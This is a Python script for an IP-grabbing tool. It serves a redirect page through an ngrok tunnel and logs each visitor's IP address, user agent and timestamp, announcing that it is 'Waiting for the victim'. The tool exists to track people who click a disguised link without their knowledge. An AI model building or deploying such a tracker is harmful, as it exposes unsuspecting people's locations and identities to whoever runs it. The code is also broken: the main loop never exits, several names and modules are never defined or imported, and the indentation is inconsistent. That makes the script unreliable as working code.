# -*- coding: utf-8 -*-
import time
import socket
from colorama import Fore 
import os
from threading import Thread
import webbrowser

save = 0  
iplist = [] 
#banner#
print (Fore.YELLOW + '  ▄█   █████████▄ ')          
print (Fore.YELLOW + '  ██   ██      ██ ')                   
print (Fore.YELLOW + '  ██   ██      ██ ')          
print (Fore.YELLOW + '  ██   ██████████ ')                      
print (Fore.YELLOW + '  ██   ██         ')                
print (Fore.YELLOW + '  ██   ██         ')                                
print (Fore.YELLOW + '  ██   ██         ')                    
print (Fore.YELLOW + '  ██   ██         ')
#menu#
def menu():
     print ('opcions')
     print ('\t1 start')

while True:
    
    menu()
   
    opcionMenu = input("select a opcion >>")

if opcionMenu=="1":
 
 def redirect():
    class Redirect(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(302)
            self.send_header('Location', args.redirect_url)
            self.end_headers()

        def log_message(self, format, *args):
            return

    HTTPServer(("", int(args.port)), Redirect).serve_forever()
    
 def logip():   
    global iplist
    c = 0
    r = requests.get('http://localhost:4040/api/requests/http').json()
    if args.output_file:
        log = open(args.output_file, "a+")

    for i in r['requests']:
        if r['requests'][c]['request']['headers']['X-Forwarded-For'][0] not in iplist:
            ip = r['requests'][c]['request']['headers']['X-Forwarded-For'][0]
            iplist.append(ip)
            useragent = r['requests'][c]['request']['headers']['User-Agent'][0]
            date = r['requests'][c]['start']
            info = "[ + ] REQUEST ID: {}\n[ + ] Date: {}\n[ + ] IP ADDRESS: {}\n[ + ] User Agent: {}".format(
                iplist.index(ip),
                date, ip,
                useragent)
            print(info)
            if args.output_file:
                log.write(info)
                log.close()
 def verifyconnection():
    global save
    c = 0
    r = requests.get("http://127.0.0.1:4040/api/tunnels/command_line%20(http)").json()
    count = r['metrics']['conns']['count']
 if count > save:
             save = count
             logip()
             time.sleep(5)
 def startngrok():             
     os.system("{} http {} > /dev/null &".format(args.ngrok_path, args.port))
     print("Starting ngrok... \n")
     time.sleep(3)
     r = requests.get('http://127.0.0.1:4040/api/tunnels').json()
     url = r['tunnels'][0]['public_url'].replace("https://", "http://")

     print("[ $ ] Use this url: {} [ you can shorten it  ]\n".format(url))
     print("Waiting for the victim[ ? ]\n")
